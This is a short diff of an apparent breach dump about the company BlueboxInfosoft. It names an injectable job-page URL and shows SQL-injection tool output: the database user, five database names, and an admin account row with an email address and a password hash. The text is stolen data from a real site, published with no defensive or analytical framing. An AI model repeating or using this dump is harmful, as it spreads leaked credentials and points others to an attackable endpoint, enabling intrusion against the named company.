@@ -4,11 +4,14 @@ IT Services and Software Development company - BlueboxInfosoft
 
 http://www.blueboxinfosoft.com/careers/job.php?id=16
 
-[+] information_schema
-[+] itsguru_blueboxi_blueboxinfosoft
-[+] itsguru_blueboxi_blueboxphp
-[+] itsguru_blueboxi_tweetshare_api
-[+] itsguru_blueboxi_wp
+[+] 'itsguru_blueboxi_bbphp'@'localhost' [1]:
+
+available databases [5]:                                                                                                                                             
+[*] information_schema
+[*] itsguru_blueboxi_blueboxinfosoft
+[*] itsguru_blueboxi_blueboxphp
+[*] itsguru_blueboxi_tweetshare_api
+[*] itsguru_blueboxi_wp
 
 UserName   Email                           Password
 admin      contact@blueboxinfosoft.com     2d6259a63c86c2efec54e9ff68dbc9c0
